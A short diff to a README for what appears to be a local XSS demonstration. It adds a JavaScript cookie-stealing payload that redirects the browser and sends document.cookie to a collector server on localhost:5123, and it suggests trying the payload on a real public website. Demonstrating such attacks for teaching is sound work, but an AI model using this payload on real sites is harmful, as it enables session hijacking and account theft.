@@ -13,9 +13,11 @@ To use:
     Notice: This only works locally(logically), which means you 
     have to have a local server running with your website (and a database for comments/usercontent) 
     in order to test it.
+    Go to the url: localhost:5123
     
-    Copy and paste the content of payload.txt into the console of 
-    another browser window or another device on your network.
+    Copy and paste the content of payload.txt : 
+        document.location='http://localhost:5123/cookie/'+document.cookie;
+    into the console of another browser window or another device on your network.
     This textstring might be what the user run if your website is not secure.
     
     To test, try using the payload on a website like https://developer.mozilla.org/en-US/
